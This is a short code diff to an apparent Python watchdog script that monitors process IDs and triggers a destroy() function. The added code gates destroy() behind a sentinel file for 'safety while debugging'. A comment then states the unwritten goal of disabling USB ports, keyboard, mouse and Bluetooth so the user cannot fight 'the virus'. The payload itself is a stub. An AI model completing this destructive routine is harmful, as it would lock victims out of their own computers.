@@ -1,3 +1,4 @@
+import sys
 import psutil
 import os
 import time
@@ -53,4 +54,8 @@ def check_pids(pids): # checks that all of the pids of the scripts exist (theref
                 print('destroy') # destroy
 
 def destroy():
-    pass
+    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
+        sys.exit()
+    else:
+        # Disable all user interfaces (bluetooth, USB mouse/keyboard, all USB ports) so user can't manually fight against virus
+        pass
